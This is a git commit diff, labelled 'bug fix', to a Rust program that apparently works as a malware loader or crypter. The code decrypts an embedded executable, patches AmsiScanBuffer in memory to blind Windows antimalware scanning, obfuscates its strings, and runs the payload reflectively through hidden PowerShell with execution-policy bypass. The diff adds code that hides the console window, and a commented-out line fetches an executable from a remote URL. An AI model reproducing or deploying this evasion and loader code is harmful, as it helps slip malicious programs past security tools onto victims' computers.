4ea66960ae845f957d777df8eaf6fb229721853e
Jaxii <jaxmontelongo@gmail.com>
2022-05-20 13:43:45 -0500

    bug fix

--- src/main.rs
+++ src/main.rs
@@ -3,7 +3,7 @@ use base64;
 use include_crypt::{EncryptedFile, include_crypt, obfstr::obfconst};
 use obfstr::obfstr;
 use std::process::Command;
-use std::{ffi::CString, ptr};
+use std::{ffi::CString, process, ptr};
 
 use winapi::{
     um::{
@@ -28,7 +28,7 @@ use winapi::{
 };
 
 fn xref() -> &'static EncryptedFile {
-    static FILE: EncryptedFile = include_crypt!(AES,"C:\\Users\\Desktop\\File.exe");
+    static FILE: EncryptedFile = include_crypt!(AES,"C:\\Users\\JaxLa\\Desktop\\Jlaive.exe");
     obfstr::xref!(&FILE)
 }
 
@@ -37,8 +37,8 @@ fn patch() {
     unsafe {
         // Credits to https://github.com/trickster0/OffensiveRust/tree/master/amsi_bypass
         let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
-        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
-        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
+        let amsi_dll = LoadLibraryA(CString::new(obfstr!("amsi")).unwrap().as_ptr());
+        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new(obfstr!("AmsiScanBuffer")).unwrap().as_ptr());
         let mut old_permissions: DWORD = 0;
 
         // Overwrite this address with nops.
@@ -53,23 +53,33 @@ fn patch() {
 
         // Restoring the permissions.
         VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
-        println!("{}", obfstr!("[+] AmsiScanBuffer patched!"));
+        //println!("{}", obfstr!("[+] AmsiScanBuffer patched!"));
 
     }
-
-
 }
+
+fn hide_console_window() {
+    use std::ptr;
+    use winapi::um::wincon::GetConsoleWindow;
+    use winapi::um::winuser::{ShowWindow, SW_HIDE};
+
+    let window = unsafe {GetConsoleWindow()};
+    // https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
+    if window != ptr::null_mut() {
+        unsafe {
+            ShowWindow(window, SW_HIDE);
+        }
+    }
+}
+
 fn main() {
 
     //  use litcrypt::{lc, use_litcrypt};
     //  use reqwest;
     //  let bytes =  reqwest::blocking::get(obfstr!("https://example.com/file.exe)).unwrap().bytes();
-
-    let new = base64::encode(xref().decrypt());
-
-    let script = obfstr!("[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"").to_owned() + new.as_str() + obfstr!("\")).EntryPoint.Invoke($null, $null)");
+    let script = obfstr!("[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"").to_owned() + base64::encode(xref().decrypt()).as_str() + obfstr!("\")).EntryPoint.Invoke($null, $null)");
         patch();
-        if let Ok(_command) = Command::new("powershell")
+        if let Ok(command) = Command::new("powershell")
             .arg("-NoProfile")
             .arg("-WindowStyle")
             .arg("Hidden")
@@ -77,11 +87,11 @@ fn main() {
             .arg("Bypass")
             .arg("-Command")
             .arg(script)
-            .creation_flags(0x08000000)
-           // .creation_flags(0x00000001)
+           // .creation_flags(0x00000001) //attach debugger
             .output()
         {
-            println!("{}",obfstr!("success!"))
+            println!("{}",obfstr!("success!"));
+            hide_console_window()
         }
 }
 //
